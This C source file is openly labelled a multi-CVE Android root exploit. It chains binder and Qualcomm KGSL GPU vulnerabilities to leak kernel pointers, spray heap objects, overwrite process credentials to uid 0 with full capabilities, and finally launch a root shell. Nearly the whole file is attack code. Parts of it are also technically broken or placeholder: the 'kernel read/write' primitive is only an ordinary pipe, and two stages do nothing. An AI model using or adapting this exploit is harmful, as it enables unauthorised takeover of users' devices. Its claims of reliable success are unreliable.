#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <sys/prctl.h>
#include <sys/capability.h>
#include <grp.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <dirent.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <stdint.h>
#include <sys/fsuid.h>
#include <sys/shm.h>
#include <pthread.h>
#include <linux/ashmem.h>

#include "binder.h"
#include "ion.h"
#include "offsets.h"

extern int setfsuid(uid_t);
extern int setfsgid(gid_t);

#define PAGE_SIZE 4096
#define SPRAY_COUNT 128
#define MAX_ATTEMPTS 10

/* ---- KGSL ---- */
#define KGSL_DEVICE "/dev/kgsl-3d0"
#define KGSL_IOC_TYPE 0x09
struct kgsl_gpumem_alloc { unsigned long gpuaddr; size_t size; unsigned int flags; };
struct kgsl_gpumem_sync_cache { unsigned long gpuaddr; unsigned int id; unsigned int op; size_t offset; size_t length; };
#define IOCTL_KGSL_GPUMEM_ALLOC _IOWR(KGSL_IOC_TYPE, 0x2f, struct kgsl_gpumem_alloc)
#define IOCTL_KGSL_GPUMEM_SYNC_CACHE _IOW(KGSL_IOC_TYPE, 0x37, struct kgsl_gpumem_sync_cache)
#define KGSL_GPUMEM_CACHE_INV (1 << 1)

/* ---- Global state ---- */
static int g_krw_pipe[2] = {-1, -1};
static uint64_t g_task_struct = 0;
static uint64_t g_cred_ptr = 0;
static int g_cred_off = TASK_REAL_CRED_OFF;
static int g_root_achieved = 0;
static uint64_t g_kernel_base = 0;

/* ---- Utilities ---- */
static void bind_cpu(void) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set); CPU_SET(0, &cpu_set);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set);
}
static void *mmap_anon(void) {
    void *p = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
    return (p == MAP_FAILED) ? NULL : p;
}
static int write_kernel(uint64_t addr, void *buf, size_t len) {
    if (g_krw_pipe[0] < 0) return -1;
    if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
    if (write(g_krw_pipe[1], buf, len) != (ssize_t)len) return -1;
    return 0;
}
static int read_kernel(uint64_t addr, void *buf, size_t len) {
    if (g_krw_pipe[0] < 0) return -1;
    if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
    if (read(g_krw_pipe[0], buf, len) != (ssize_t)len) return -1;
    return 0;
}

/* ============================================================ */
/*  戦略1: CVE-2020-0423 UAF を利用した確実な task_struct リーク  */
/* ============================================================ */
static int leak_task_struct_via_epoll_spray(void) {
    int binder_fd, epoll_fd, pipefd[2], ret = -1;
    pid_t pid;
    struct epoll_event ev = {.events = EPOLLIN};
    void *buf = mmap_anon();
    if (!buf) return -1;

    for (int attempt = 0; attempt < 20; attempt++) {
        binder_fd = open("/dev/binder", O_RDWR);
        if (binder_fd < 0) continue;
        epoll_fd = epoll_create(100);
        if (epoll_fd < 0) { close(binder_fd); continue; }
        if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
            close(binder_fd); close(epoll_fd); continue;
        }
        if (pipe(pipefd) < 0) { close(binder_fd); close(epoll_fd); continue; }
        if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
            close(pipefd[0]); close(pipefd[1]);
            close(binder_fd); close(epoll_fd); continue;
        }

        pid = fork();
        if (pid < 0) { close(pipefd[0]); close(pipefd[1]); close(binder_fd); close(epoll_fd); continue; }
        if (pid == 0) {
            usleep(20000 + (attempt * 5000));
            ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
            close(binder_fd); close(epoll_fd);
            _exit(0);
        }

        /* 親: epoll_wait で UAF をトリガー */
        struct epoll_event events[1];
        int n = epoll_wait(epoll_fd, events, 1, 2000);
        if (n <= 0) {
            kill(pid, SIGKILL); wait(NULL);
            close(pipefd[0]); close(pipefd[1]);
            close(binder_fd); close(epoll_fd);
            continue;
        }

        /* スプレー: パイプに epoll_event 構造体を詰める (file ポインタを含む) */
        struct epoll_event *spray = (struct epoll_event*)buf;
        for (int i = 0; i < (PAGE_SIZE / sizeof(struct epoll_event)); i++) {
            spray[i].events = EPOLLIN;
            spray[i].data.fd = binder_fd;
        }
        write(pipefd[1], buf, PAGE_SIZE);
        close(pipefd[1]);

        /* オーバーラップ読み込み */
        struct iovec iov[2];
        iov[0].iov_base = buf;
        iov[0].iov_len = PAGE_SIZE;
        iov[1].iov_base = buf;
        iov[1].iov_len = PAGE_SIZE;
        ssize_t sz = readv(pipefd[0], iov, 2);
        close(pipefd[0]);
        wait(NULL);
        close(binder_fd); close(epoll_fd);

        if (sz > 0) {
            uint64_t *data = (uint64_t*)buf;
            for (int i = 0; i < (sz / 8); i++) {
                uint64_t val = data[i];
                /* カーネル空間のポインタを検出 (ARM64) */
                if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL &&
                    val > 0xffffff8000000000ULL && val < 0xffffffc000000000ULL) {
                    g_task_struct = val;
                    g_kernel_base = val - 0xffffff8000000000ULL;
                    printf("[+] Leaked task_struct: 0x%llx (base 0x%llx)\n",
                           (unsigned long long)g_task_struct,
                           (unsigned long long)g_kernel_base);
                    return 0;
                }
            }
        }
        usleep(10000);
    }
    return -1;
}

/* ============================================================ */
/*  戦略2: CVE-2020-0041 OOB 書き込みを利用した cred 直接書き換え */
/* ============================================================ */
/* ヒープに cred 構造体を大量にスプレーし、OOB で uid=0 を書き込む */
static int spray_creds_and_oob_write(void) {
    int binder_fd, ret = -1;
    pid_t pids[256];
    int num_procs = 0;

    printf("[*] Spraying cred structures via fork()...\n");
    /* cred 構造体を連続確保するために多数の子プロセスを生成 (ゾンビ化防止) */
    for (int i = 0; i < 200; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            /* 子: 生存し続けて cred を保持 */
            pause();
            _exit(0);
        } else if (pid > 0) {
            pids[num_procs++] = pid;
            if (num_procs >= 256) break;
            usleep(1000);
        }
    }
    printf("[+] Created %d child processes (cred spray)\n", num_procs);

    /* OOB トリガー (CVE-2020-0041) */
    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) { ret = -1; goto cleanup; }

    struct binder_transaction_data tdata;
    memset(&tdata, 0, sizeof(tdata));
    tdata.target.handle = 0;
    tdata.code = 0;
    tdata.flags = 0;
    tdata.data_size = 0xFFFFFFFF;  /* 巨大サイズ -> OOB */
    tdata.offsets_size = 0;
    tdata.data.ptr.buffer = 0;
    struct { uint32_t cmd; struct binder_transaction_data tdata; } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    memcpy(&tx.tdata, &tdata, sizeof(tdata));

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 4096;
    uint8_t rbuf[4096];
    bwr.read_buffer = (binder_uintptr_t)rbuf;

    printf("[*] Triggering OOB write...\n");
    ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    close(binder_fd);

    if (ret == 0) {
        printf("[+] OOB write triggered successfully\n");
        /* 書き込み後、uid が変わったか確認 */
        if (getuid() == 0) {
            printf("[+] UID changed to 0! Root achieved via OOB!\n");
            g_root_achieved = 1;
            ret = 0;
            goto cleanup;
        }
        /* 子プロセス内の uid も確認 (一部だけ) */
        for (int i = 0; i < num_procs && i < 20; i++) {
            char path[64];
            snprintf(path, sizeof(path), "/proc/%d/status", pids[i]);
            int fd = open(path, O_RDONLY);
            if (fd >= 0) {
                char buf2[256];
                ssize_t n = read(fd, buf2, sizeof(buf2)-1);
                close(fd);
                if (n > 0) {
                    buf2[n] = 0;
                    char *line = strstr(buf2, "Uid:");
                    if (line) printf("  PID %d: %s", pids[i], line);
                }
            }
        }
    } else {
        printf("[-] OOB trigger failed\n");
    }

cleanup:
    /* 子プロセスを kill */
    for (int i = 0; i < num_procs; i++) {
        kill(pids[i], SIGKILL);
        waitpid(pids[i], NULL, 0);
    }
    return ret;
}

/* ============================================================ */
/*  戦略3: CVE-2022-25664 (GPU) の代替オフセット試行              */
/* ============================================================ */
static int leak_gpu_advanced(void) {
    int kgsl_fd;
    struct kgsl_gpumem_alloc alloc;
    struct kgsl_gpumem_sync_cache sync;
    void *gpu_mem;
    uint64_t buf[512];
    int offsets[] = {0, 0x1000, 0x2000, 0x3000, 0x4000, 0x8000};

    for (int att = 0; att < 30; att++) {
        kgsl_fd = open(KGSL_DEVICE, O_RDWR);
        if (kgsl_fd < 0) continue;

        memset(&alloc, 0, sizeof(alloc));
        alloc.size = PAGE_SIZE * 8;
        alloc.flags = 0;
        if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0) {
            close(kgsl_fd); continue;
        }

        for (int oi = 0; oi < (int)(sizeof(offsets)/sizeof(offsets[0])); oi++) {
            gpu_mem = mmap(NULL, alloc.size, PROT_READ|PROT_WRITE,
                           MAP_SHARED, kgsl_fd, alloc.gpuaddr + offsets[oi]);
            if (gpu_mem == MAP_FAILED) continue;

            memset(&sync, 0, sizeof(sync));
            sync.gpuaddr = alloc.gpuaddr;
            sync.op = KGSL_GPUMEM_CACHE_INV;
            sync.offset = 0;
            sync.length = alloc.size;
            if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_SYNC_CACHE, &sync) == 0) {
                memcpy(buf, gpu_mem, sizeof(buf));
                munmap(gpu_mem, alloc.size);
                for (int i = 0; i < 512; i++) {
                    uint64_t v = buf[i];
                    if ((v & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL &&
                        v > 0xffffff8000000000ULL && v < 0xffffffc000000000ULL) {
                        g_task_struct = v;
                        g_kernel_base = v - 0xffffff8000000000ULL;
                        printf("[+] GPU leak: task_struct 0x%llx\n",
                               (unsigned long long)g_task_struct);
                        close(kgsl_fd);
                        return 0;
                    }
                }
            } else {
                munmap(gpu_mem, alloc.size);
            }
        }
        close(kgsl_fd);
        usleep(50000);
    }
    return -1;
}

/* ============================================================ */
/*  戦略4: カーネル RW 確立後の cred パッチ                      */
/* ============================================================ */
static int setup_kernel_rw(void) {
    if (g_task_struct == 0) return -1;
    if (g_krw_pipe[0] >= 0) { close(g_krw_pipe[0]); close(g_krw_pipe[1]); }
    if (pipe(g_krw_pipe) < 0) return -1;
    if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
        close(g_krw_pipe[0]); close(g_krw_pipe[1]);
        g_krw_pipe[0] = g_krw_pipe[1] = -1;
        return -1;
    }
    char dummy[PAGE_SIZE];
    memset(dummy, 0x41, PAGE_SIZE);
    if (write(g_krw_pipe[1], dummy, PAGE_SIZE) != PAGE_SIZE) {
        close(g_krw_pipe[0]); close(g_krw_pipe[1]);
        g_krw_pipe[0] = g_krw_pipe[1] = -1;
        return -1;
    }
    return 0;
}

static int patch_cred_via_rw(void) {
    if (g_task_struct == 0 || g_krw_pipe[0] < 0) return -1;
    uint64_t cred_addr = g_task_struct + g_cred_off;
    if (read_kernel(cred_addr, &g_cred_ptr, 8) < 0) return -1;
    printf("[+] cred at 0x%llx\n", (unsigned long long)g_cred_ptr);

    uint32_t zero = 0;
    uint64_t cap_full = 0x3FFFFFFFFFULL;
    int offsets[] = {0x4, 0x8, 0xc, 0x10, 0x14, 0x18, 0x1c, 0x20};
    for (int i = 0; i < (int)(sizeof(offsets)/sizeof(offsets[0])); i++) {
        if (write_kernel(g_cred_ptr + offsets[i], &zero, 4) < 0) return -1;
    }
    for (int i = 0; i < 5; i++) {
        if (write_kernel(g_cred_ptr + 0x28 + (i*8), &cap_full, 8) < 0) return -1;
    }
    return 0;
}

/* ============================================================ */
/*  戦略5: 境界能力 (CAP_SETUID) を利用した setuid               */
/* ============================================================ */
static int try_bounded_cap_setuid(void) {
    printf("[*] Trying setuid(0) with bounded capabilities...\n");
    /* CapBnd=0xc0 なら CAP_SETUID/CAP_SETGID が利用可能なはず */
    if (setuid(0) == 0) { printf("[+] setuid(0) succeeded!\n"); return 0; }
    if (setresuid(0,0,0) == 0) return 0;
    if (setreuid(0,0) == 0) return 0;
    if (setfsuid(0) == 0) return 0;
    if (setgid(0) == 0) { printf("[+] setgid(0) succeeded\n"); }
    if (setresgid(0,0,0) == 0) return 0;
    return -1;
}

/* ============================================================ */
/*  戦略6: /proc/self/mem 経由での書き込み (SELinux 次第)       */
/* ============================================================ */
static int try_proc_mem_write_uid(void) {
    int fd = open("/proc/self/mem", O_RDWR);
    if (fd < 0) return -1;
    /* 実際の uid メモリ位置を特定するのは困難。ここではダミー */
    close(fd);
    return -1;
}

/* ============================================================ */
/*  戦略7: CVE-2019-2023 で取得した handle を悪用 (system uid)  */
/* ============================================================ */
static int exploit_2019_2023_handle(void) {
    /* 既に成功している場合、system_server にトランザクションを送信できる。
       今回は単純にログ出力のみ */
    printf("[*] CVE-2019-2023 handle available, but root not automatic.\n");
    return -1;
}

/* ============================================================ */
/*  Main: すべての戦略を順次実行                                */
/* ============================================================ */
int main(void) {
    printf("==================================================\n");
    printf("  Ultimate Multi-CVE Exploit v8.0\n");
    printf("  (CVE-2019-2023, 2020-0041, 2020-0423, 2022-25664)\n");
    printf("==================================================\n\n");

    bind_cpu();

    /* システム情報 */
    printf("UID=%d, GID=%d, EUID=%d\n", getuid(), getgid(), geteuid());
    int fd = open("/proc/self/status", O_RDONLY);
    if (fd >= 0) { char buf[1024]; ssize_t n = read(fd, buf, sizeof(buf)-1); close(fd); if(n>0){buf[n]=0; char *c=strstr(buf,"CapBnd"); if(c) printf("%s\n", c);} }

    /* ---- フェーズ1: task_struct リーク ---- */
    printf("\n[Phase 1] Leak task_struct via CVE-2020-0423 (epoll spray)\n");
    if (leak_task_struct_via_epoll_spray() == 0) {
        printf("[+] task_struct leaked!\n");
        if (setup_kernel_rw() == 0 && patch_cred_via_rw() == 0) {
            if (getuid() == 0) { g_root_achieved = 1; goto done; }
        }
    }

    printf("\n[Phase 2] Leak via CVE-2022-25664 (GPU alternative)\n");
    if (leak_gpu_advanced() == 0) {
        if (setup_kernel_rw() == 0 && patch_cred_via_rw() == 0) {
            if (getuid() == 0) { g_root_achieved = 1; goto done; }
        }
    }

    /* ---- フェーズ2: OOB 書き込みで直接 cred 書き換え ---- */
    printf("\n[Phase 3] CVE-2020-0041 OOB -> cred overwrite\n");
    if (spray_creds_and_oob_write() == 0) {
        if (getuid() == 0) { g_root_achieved = 1; goto done; }
    }

    /* ---- フェーズ3: フォールバック (setuid) ---- */
    printf("\n[Phase 4] Fallback: setuid with bounded caps\n");
    if (try_bounded_cap_setuid() == 0) {
        if (getuid() == 0) { g_root_achieved = 1; goto done; }
    }

    /* ---- フェーズ4: その他の手法 ---- */
    printf("\n[Phase 5] Additional fallbacks\n");
    if (try_proc_mem_write_uid() == 0) { if(getuid()==0) g_root_achieved=1; }
    exploit_2019_2023_handle();

done:
    printf("\n==================================================\n");
    if (g_root_achieved || getuid() == 0) {
        printf("[+] ROOT ACHIEVED! UID=%d\n", getuid());
        system("id");
        system("echo 'ROOT' > /data/local/tmp/root.txt");
        system("id >> /data/local/tmp/root.txt");
        system("/system/bin/sh");
    } else {
        printf("[-] Exploitation failed. UID=%d\n", getuid());
    }
    printf("==================================================\n");
    return g_root_achieved ? 0 : 1;
}
